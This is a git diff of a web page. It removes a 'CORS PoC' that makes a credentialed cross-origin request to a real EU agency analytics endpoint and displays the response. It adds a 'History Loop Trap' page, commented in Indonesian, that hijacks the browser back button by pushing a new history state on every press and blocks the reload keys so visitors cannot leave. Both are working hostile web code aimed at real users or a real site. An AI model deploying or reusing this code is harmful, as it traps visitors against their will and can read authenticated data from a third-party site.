@@ -1,22 +1,263 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>History Loop Trap</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 16px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 40px;
+            padding: 48px 40px;
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+        }
+
+        h1 {
+            font-size: 2.6rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .emoji-big {
+            font-size: 4rem;
+            display: block;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 1.05rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+
+        .highlight {
+            color: #f472b6;
+            font-weight: 600;
+        }
+
+        .counter-box {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 16px 0 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .counter-label {
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .counter-number {
+            color: #f472b6;
+            font-size: 4rem;
+            font-weight: 800;
+            display: block;
+            line-height: 1.2;
+        }
+
+        .btn {
+            padding: 16px 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 60px;
+            background: linear-gradient(135deg, #ec4899, #be185d);
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 8px 24px rgba(236, 72, 153, 0.3);
+            width: 100%;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 32px rgba(236, 72, 153, 0.5);
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .warning {
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 0.8rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 18px;
+        }
+
+        .back-indicator {
+            display: inline-block;
+            background: rgba(244, 114, 182, 0.12);
+            color: #f472b6;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            margin-top: 12px;
+            border: 1px solid rgba(244, 114, 182, 0.15);
+        }
+    </style>
+</head>
 <body>
-<h1>CORS PoC</h1>
-<pre id="output">Loading...</pre>
-<script>
-fetch("https://extranet.emsa.europa.eu/analytics/piwik.php", {
-  method: "GET",
-  credentials: "include"
-})
-.then(r => {
-  document.getElementById("output").innerText = 
-    "Status: " + r.status + "\nHeaders: " + r.headers.get("content-type");
-  return r.text();
-})
-.then(data => {
-  document.getElementById("output").innerText += "\nData: " + data;
-})
-.catch(e => document.getElementById("output").innerText = "Error: " + e);
-</script>
+
+    <div class="card">
+        <span class="emoji-big">🔄</span>
+        <h1>History Loop</h1>
+        <p class="subtitle">
+            Tekan tombol <span class="highlight">⬅️ Back</span> di browser kamu.
+            <br />Lihat apa yang terjadi...
+        </p>
+
+        <div class="counter-box">
+            <span class="counter-label">Kamu sudah mencoba back sebanyak</span>
+            <span class="counter-number" id="backCounter">0</span>
+            <span class="counter-label">kali</span>
+        </div>
+
+        <button class="btn" id="resetBtn">🧹 Reset & Keluar</button>
+        
+        <div class="back-indicator" id="lastAction">
+            ⏳ Belum ada aksi
+        </div>
+
+        <div class="warning">
+            ⚠️ Tombol back browser akan <strong>selalu</strong> kembali ke halaman ini.
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Counter buat ngerekam berapa kali user mencoba back
+            let backCount = parseInt(localStorage.getItem('historyLoopCount')) || 0;
+            const counterEl = document.getElementById('backCounter');
+            const lastActionEl = document.getElementById('lastAction');
+            
+            // Update tampilan awal
+            counterEl.textContent = backCount;
+
+            // === INI JEBOLNYA ===
+            // Setiap kali halaman dimuat, kita push state baru
+            // Jadi history browser selalu punya "halaman ini" sebagai yang terakhir
+            
+            function pushNewState() {
+                // Push state dengan URL yang sama tapi beda state object
+                const stateObj = { 
+                    time: Date.now(),
+                    count: backCount 
+                };
+                history.pushState(stateObj, '', window.location.href);
+                
+                // Update indikator
+                lastActionEl.textContent = '✅ State baru ditambahkan ke history';
+                lastActionEl.style.color = '#34d399';
+                
+                console.log(`📌 Push state ke-${backCount + 1}`);
+            }
+
+            // === DETECT TOMBOL BACK ===
+            // Event 'popstate' terpicu saat user tekan back/forward
+            window.addEventListener('popstate', function(event) {
+                // Tambah counter
+                backCount += 1;
+                localStorage.setItem('historyLoopCount', backCount);
+                counterEl.textContent = backCount;
+                
+                // Update indikator
+                lastActionEl.textContent = `⬅️ Kamu tekan BACK! (ke-${backCount})`;
+                lastActionEl.style.color = '#f472b6';
+                
+                console.log(`🔁 Back ditekan! Total: ${backCount}`);
+                
+                // ⭐ KRUSIAL: Push state BARU setelah popstate
+                // Ini yang bikin loop - setiap back malah nambah state lagi
+                pushNewState();
+                
+                // Efek visual getar
+                document.querySelector('.card').style.transform = 'scale(0.98)';
+                setTimeout(() => {
+                    document.querySelector('.card').style.transform = '';
+                }, 150);
+            });
+
+            // === INITIAL SETUP ===
+            // Saat pertama kali load, kita push state awal
+            // Biar history-nya langsung punya 1 state
+            if (history.state === null) {
+                pushNewState();
+            } else {
+                // Kalau udah ada state, push lagi biar aman
+                pushNewState();
+            }
+
+            // === TOMBOL RESET ===
+            document.getElementById('resetBtn').addEventListener('click', function() {
+                // Reset counter
+                backCount = 0;
+                localStorage.setItem('historyLoopCount', '0');
+                counterEl.textContent = '0';
+                lastActionEl.textContent = '🧹 Counter di-reset';
+                lastActionEl.style.color = '#fbbf24';
+                
+                // Kosongkan history (cara simple: pindah ke halaman kosong lalu balik)
+                // TAPI biar tetap di sini, kita push state baru
+                // Hapus semua state dengan replace
+                history.replaceState(null, '', window.location.href);
+                pushNewState();
+                
+                console.log('🔄 Reset semua state');
+            });
+
+            // === TAMBAHAN: Cegah reload pake Ctrl+R (opsional) ===
+            // Ini untuk efek "stuck" maksimal
+            window.addEventListener('keydown', function(e) {
+                // Cegah reload dengan Ctrl+R atau F5
+                if ((e.ctrlKey || e.metaKey) && e.key === 'r') {
+                    e.preventDefault();
+                    lastActionEl.textContent = '🚫 Gak bisa reload! Tetap di sini.';
+                    lastActionEl.style.color = '#ef4444';
+                    
+                    // Push state lagi biar makin mantap
+                    pushNewState();
+                }
+                // Cegah F5
+                if (e.key === 'F5') {
+                    e.preventDefault();
+                    lastActionEl.textContent = '🚫 F5 gak berpengaruh!';
+                    lastActionEl.style.color = '#ef4444';
+                    pushNewState();
+                }
+            });
+
+            console.log('🔥 History Loop aktif! Coba tekan tombol back browser.');
+        })();
+    </script>
+
 </body>
 </html>
